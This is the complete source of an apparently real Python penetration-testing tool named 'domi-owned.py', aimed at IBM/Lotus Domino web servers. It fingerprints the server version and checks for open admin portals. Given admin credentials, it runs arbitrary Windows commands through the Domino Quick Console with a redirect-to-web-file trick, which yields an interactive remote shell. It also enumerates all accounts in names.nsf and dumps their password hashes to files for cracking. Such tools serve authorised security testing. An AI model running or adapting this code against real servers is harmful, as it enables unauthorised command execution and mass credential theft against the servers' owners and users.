#!/usr/bin/env python
# Copyright (c) 2015, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import cmd
import re
import requests
import sys
import urllib
from bs4 import BeautifulSoup
from simple_requests import Requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Interactive(cmd.Cmd):
	"""Interact with Domino Quick Console through web requests"""

	def __init__(self):
		cmd.Cmd.__init__(self)
		self.prompt = 'C:\Windows\System32>'
		self.target = target
		self.username = username
		self.password = password
		self.local_path = local_path
		self.HEADER = HEADER

	def emptyline(self):
		pass

	def default(self, line):
		operator = '> '
		self.quick_console(line, operator, self.target, self.username, self.password, self.local_path, self.HEADER)

	# Handle Domino Quick Console
	def quick_console(self, command, operator, url, username, password, path, header):
		session = requests.Session()
		session.auth = (username, password)

		# Encode command
		raw_command = 'load cmd /c {0} {1}"{2}Domino\\data\\domino\\html\\download\\filesets\\log.txt"'.format(command, operator, path)
		encoded_command = urllib.quote(raw_command, safe='')

		quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(url, encoded_command)
		response_url = "{0}/download/filesets/log.txt".format(url)

		# Send commands and handle cleanup
		send_command = session.get(quick_console_url, headers=header, verify=False)
		if send_command.status_code == 200:
			get_response = session.get(response_url, headers=header, verify=False)
			if get_response.status_code == 200 and '>' in operator:
				print get_response.text
			elif get_response.status_code == 200 and '>' not in operator:
				print 'Unable to delete outfile!'
			elif get_response.status_code == 404 and '>' not in operator:
				print 'Outfile sucessfully deleted'
			else:
				print 'Outfile not found!'
				do_exit
		else:
			print 'Quick Console is unavaliable!'
			do_exit

	def do_EOF(self, line):
		operator = ''
		command = 'del'
		self.quick_console(command, operator, self.target, self.username, self.password, self.local_path, self.HEADER)
		return True

	def help_EOF(self):
		print "Use exit or quit to cleanly exit." 

	do_exit = do_quit = do_EOF
	help_exit = help_quit = help_EOF

# Get Domino version
def fingerprint(url, header):
	domino_version = None

	version_files = ['download/filesets/l_LOTUS_SCRIPT.inf', 
			'download/filesets/n_LOTUS_SCRIPT.inf',
			'download/filesets/l_SEARCH.inf',
			'download/filesets/n_SEARCH.inf'
		]

	for version_file in version_files:
		try:
			version_url = "{0}/{1}".format(url, version_file)
			request = requests.get(version_url, timeout=(5), headers=header, verify=False)
			if request.status_code == 200:
				version_regex = re.search("(?i)version=([0-9].[0-9].[0-9])", request.text)
				if version_regex:
					domino_version = version_regex.group(1)
					break
			else:
				continue

		except:
			continue

	if domino_version:
		print_good("Domino version: {0}".format(version_regex.group(1)))
	else:
		print_warn('Unable to fingerprint Domino version!')

# Check for open authentication to names.nsf and webadmin.nsf
def check_portals(url, header):
	portals = ['names.nsf', 'webadmin.nsf']
	for portal in portals:
		try:
			portal_url = "{0}/{1}".format(url, portal)
			request = requests.get(portal_url, headers=header, verify=False)
			if request.status_code == 200:
				if 'form method="post"' in request.text:
					print_warn("{0}/{1} requires authentication".format(url, portal))
				else:
					print_good("{0}/{1} does NOT require authentication".format(url, portal))
			elif request.status_code == 401:
				print_warn("{0}/{1} requires authentication!".format(url, portal))
			else:
				print_warn("Could not find {0}!".format(portal))

		except:
			continue

# Check access to webadmin.nsf and get local file path
def check_access(url, header, username, password):
	session = requests.Session()
	session.auth = (username, password)
	who_am_i, local_path = None, None

	try:
		webadmin_url = "{0}/webadmin.nsf".format(url)
		check_webadmin = session.get(webadmin_url, headers=header, verify=False)
		if check_webadmin.status_code == 200:
			if 'form method="post"' in check_webadmin.text:
				print_warn('Unable to access webadmin.nsf, maybe you are not admin?')
			else:
				path_url = "{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(url)
				check_path = session.get(path_url, headers=header, verify=False)
				path_regex = re.search('>(?i)([a-z]:\\\\[a-z0-9()].+\\\\[a-z].+)\\\\domino\\\\data', check_path.text)
				if path_regex:
					path = path_regex.group(1)
				else:
					path = None
					print_status('Could not identify Domino file path, trying defaults...')

				who_am_i, local_path = test_command(url, header, path, username, password)
		elif check_webadmin.status_code == 401:
			print_warn('Unable to access webadmin.nsf, maybe you are not admin?')
		else:
			print_warn('Unable to find webadmin.nsf!')

	except Exception as error:
		print_error("Error: {0}".format(error))

	if who_am_i and local_path:
		print_good("Running as {0}".format(who_am_i))
		return local_path

# Test outfile redirection
def test_command(url, header, path, username, password):
	session = requests.Session()
	session.auth = (username, password)
	who_am_i, local_path = None, None

	# Default Domino install paths
	paths = ['C:\\Program Files\\IBM\\',            # 9.0.1 Windows x64
		'C:\\Program Files\\IBM\\Lotus\\',          # 8.5.3 Windows x64
		'C:\\Program Files (x86)\\IBM\\',           # 9.0.1 Windows x86
		'C:\\Program Files (x86)\\IBM\\Lotus\\',    # 8.5.3 Windows x86
		'C:\\Lotus\\'                               # Not sure, but just in case
	]

	if path:
		found_path = "{0}\\".format(path)
		paths.insert(0, found_path)

	for local_path in paths:
		try:
			# Encode command
			raw_command = 'load cmd /c whoami > "{0}Domino\\data\\domino\\html\\download\\filesets\\log.txt"'.format(local_path)
			encoded_command = urllib.quote(raw_command, safe='')

			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(url, encoded_command)
			response_url = "{0}/download/filesets/log.txt".format(url)

			# Do things...
			send_command = session.get(quick_console_url, headers=header, verify=False)
			if send_command.status_code == 200:
				get_response = session.get(response_url, headers=header, verify=False)
				if get_response.status_code == 200:
					user_regex = re.search(".+\\\\(.+)", get_response.text)
					if user_regex:
						who_am_i = user_regex.group(1)
						break

		except:
			continue

	return who_am_i, local_path

# Get user profile URLs
def enum_accounts(url, header, username, password):
	accounts = []
	account_urls = []
	session = requests.Session()
	session.auth = (username, password)

	for page in range(1, 100000, 1000):
		try:
			pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}&Count=1000".format(url, page)
			request = session.get(pages, headers=header, timeout=(60), verify=False)
			if request.status_code == 200:
				if 'form method="post"' in request.text:
					print_warn('Unable to access names.nsf, bad username or password!')
					break
				else:
					soup = BeautifulSoup(request.text, 'lxml')
					empty_page = soup.findAll('h2')
					if empty_page:
						break
					else:
						links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
						for link in links:
							account_regex = re.search("/(([a-fA-F0-9]{32})/([a-fA-F0-9]{32}))", link)
							if account_regex and account_regex.group(1) not in accounts:
								accounts.append(account_regex.group(1))
							else:
								pass
			elif request.status_code == 401:
				print_warn('Unable to access names.nsf, bad username or password!')
				break
			else:
				print_warn('Could not connect to Domino server!')
				break

		except Exception as error:
			print_error("Error: {0}".format(error))
			break

	if len(accounts) > 0:
		print_good("Found {0} accounts, dumping hashes".format(len(accounts)))
		for unid in accounts:
			account_urls.append("{0}/names.nsf/{1}?OpenDocument".format(url, unid))

		async_requests(account_urls, header, username, password)

# Asynchronously get accounts
def async_requests(accounts, header, username, password):
	requests = Requests(concurrent=40)
	requests.session.headers = header
	requests.session.auth = (username, password)
	requests.session.verify = False

	try:
		for account_url in requests.swarm(accounts, maintainOrder=False):	
			if account_url.status_code == 200:
				get_domino_hash(account_url)

	except KeyboardInterrupt:
		requests.stop(killExecuting=True)

# Dump Domino hashes
def get_domino_hash(response):
	soup = BeautifulSoup(response.text, 'lxml')

	try:
		# Get account username
		username_params = ['$dspFullName', '$dspShortName']
		for user_param in username_params:
			domino_username = (soup.find('input', attrs={'name':user_param}))['value']
			if len(domino_username) > 0:
				break
			else:
				continue

		# Get account hash
		hash_params = ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']
		for hash_param in hash_params:
			domino_hash = (soup.find('input', attrs={'name':hash_param}))['value']
			if len(domino_hash) > 0:
				break
			else:
				continue

	except:
		pass

	if domino_username and domino_hash:
		print "{0}, {1}".format(domino_username.encode('utf-8'), domino_hash)
		write_hash(domino_username.encode('utf-8'), domino_hash)

# Sort and write hashes to file
def write_hash(duser, dhash):
		# Lotus Domino 5 format: 3dd2e1e5ac03e230243d58b8c5ada076
		if len(dhash) == 34:
			with open('domino_5_hashes.txt', 'a') as format_five:
				hash_format = "{0}:{1}\n".format(duser, dhash.strip('()'))
				format_five.write(hash_format)
			format_five.close()
		# Lotus Domino 6 format: (GDpOtD35gGlyDksQRxEU)
		elif len(dhash) == 22:
			with open('domino_6_hashes.txt', 'a') as format_six:
				hash_format = "{0}:{1}\n".format(duser, dhash)
				format_six.write(hash_format)
			format_six.close()
		# Lotus Domino 8 format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
		else:
			with open('domino_8_hashes.txt', 'a') as format_eight:
				hash_format = "{0}:{1}\n".format(duser, dhash)
				format_eight.write(hash_format)
			format_eight.close()

def print_error(msg):
	print "\033[1m\033[31m[-]\033[0m {0}".format(msg)
	
def print_status(msg):
	print "\033[1m\033[34m[*]\033[0m {0}".format(msg)
		
def print_good(msg):
	print "\033[1m\033[32m[+]\033[0m {0}".format(msg)
	
def print_warn(msg):
	print "\033[1m\033[33m[!]\033[0m {0}".format(msg)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(
		prog='domi-owned.py',
		formatter_class=argparse.RawDescriptionHelpFormatter,
		description=("""
         __________   __________ __________ 
        |          |\|          |          |\\
        |  *    *  |||  *  *  * |        * ||
        |  *    *  |||          |     *    ||
        |  *    *  |||  *  *  * |  *       ||
        |__________|||__________|__________||
        |          || `---------------------`
        |  *    *  ||
        |          ||
        |  *    *  ||
        |__________||
         `----------`

             IBM/Lotus Domino OWNage
"""))
	parser.add_argument('--url', help='Domino server URL', required=False)
	parser.add_argument('-u', '--username', help='Username', default='', required=False)
	parser.add_argument('-p', '--password', help='Password', default='', nargs='+', required=False)
	parser.add_argument('--hashdump', help='Dump Domino hashes', action='store_true', required=False)
	parser.add_argument('--quickconsole', help='Interact with Domino Quick Console', action='store_true', required=False)
	args = parser.parse_args()

	# Define variables
	username = args.username
	password = ' '.join(args.password)

	HEADER = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'keep-alive'
	}

	# Process Domino URL
	if args.url:
		url_regex = re.search("((https?)://([a-zA-Z0-9.-]+))", args.url)
		if url_regex:
			target = url_regex.group(1)
		else:
			print_warn("Please provide a valid URL!")
	else:
		parser.parse_args('-h'.split())

	# Interact with quick console
	if args.quickconsole:
		print_status('Accessing Domino Quick Console...')
		local_path = check_access(target, HEADER, username, password)
		if local_path:
			Interactive().cmdloop()

	# Dump hashes
	elif args.hashdump:
		print_status('Enumerating accounts...')
		enum_accounts(target, HEADER, username, password)

	# Fingerprint
	else:
		print_status('Fingerprinting Domino server...')
		fingerprint(target, HEADER)
		check_portals(target, HEADER)
